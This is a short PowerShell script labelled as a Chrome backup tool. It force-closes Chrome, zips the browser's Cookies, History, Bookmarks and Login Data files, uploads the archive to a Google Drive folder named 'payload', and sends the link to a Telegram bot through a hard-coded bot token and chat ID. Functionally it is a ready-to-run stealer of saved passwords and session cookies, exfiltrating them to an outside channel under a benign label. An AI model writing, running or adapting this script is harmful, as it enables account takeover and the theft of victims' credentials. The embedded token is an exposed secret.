# ==== User Configuration ====
$botToken = "8529187820:AAGN2vlcmLBtf-EaZKWfkR9ufRrVOssQMKo"
$chatId   = "8121448802"
$googleDriveFolderPath = "payload"  # Google Drive folder name

# ==== 1. Compress Chrome Data ====
$src = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$zipPath = "$env:TEMP\ChromeBackup.zip"

Write-Host "[1/4] Compressing Chrome data..."
Write-Host "Terminating Chrome processes..."
Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

if (Test-Path $zipPath) { Remove-Item $zipPath -Force }

# Compress only essential folders (faster)
$foldersToCompress = @(
    "$src\Default\Cookies",
    "$src\Default\History",
    "$src\Default\Bookmarks",
    "$src\Default\Login Data"
)

$foldersToCompress | Where-Object { Test-Path $_ } | ForEach-Object {
    Compress-Archive -Path $_ -DestinationPath $zipPath -Update
}

# ==== 2. Upload to Google Drive using rclone ====
Write-Host "[2/4] Uploading to Google Drive..."

$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$fileName = "ChromeBackup_$timestamp.zip"

# Check if rclone is installed
$rclonePath = "rclone.exe"
$rcloneCheck = Get-Command $rclonePath -ErrorAction SilentlyContinue

if ($rcloneCheck) {
    try {
        # Upload using rclone to gdrive:payload folder
        & $rclonePath copy $zipPath "gdrive:$googleDriveFolderPath" -v
        
        Write-Host "[3/4] Upload successful!"
        $link = "https://drive.google.com/drive/folders/payload"
        Write-Host $link
    } catch {
        Write-Host "[3/4] Upload failed: $_"
        Write-Host "File saved locally: $zipPath"
        $link = $zipPath
    }
} else {
    Write-Host "[3/4] rclone not installed. Using local backup only."
    Write-Host "Install rclone from: https://rclone.org/downloads/"
    Write-Host "File saved: $zipPath"
    $link = $zipPath
}

# ==== 3. Send to Telegram ====
Write-Host "[4/4] Sending link to Telegram..."
$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage"
Invoke-RestMethod -Uri $telegramUrl -Method Post -Body @{
    chat_id = $chatId
    text    = "Chrome backup link: $link"
}

Write-Host "Done! Check Telegram for the link."
